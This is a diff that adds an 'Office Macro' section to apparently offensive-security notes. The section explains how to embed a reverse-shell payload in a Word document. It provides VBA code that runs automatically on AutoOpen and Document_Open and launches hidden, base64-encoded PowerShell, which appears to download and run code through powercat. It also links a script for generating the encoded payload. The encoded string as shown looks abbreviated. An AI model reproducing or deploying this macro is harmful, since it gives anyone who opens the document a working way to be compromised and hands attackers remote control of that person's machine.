@@ -61,6 +61,31 @@ $EncodedText
 ```
 {: file='~/naughty.ps1'}
 
+### Office Macro
+
+Here's a basic macro that invokes [`powercat`](https://github.com/besimorhino/powercat) to create a reverse shell.  Getting everything right for that payload is tedious, so I made a quick script ([payload.py](https://github.com/some-natalie/dotfiles/blob/main/scripts/msft/office/payload.py)) to create the base64-encoded payload for a simple reverse shell.  Then paste that content into the macro below.  Make sure to save the macro attached to the document (not the workspace).  Use `.docm` or `.doc` for Word, etc. for other formats.
+
+```vb
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    ' edit the payload.py inputs to produce the right output here
+    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
+        Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
+        Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
+        Str = Str + "A"
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+{: file='cheeky-macro.bas'}
+
 ---
 
 ## Catching
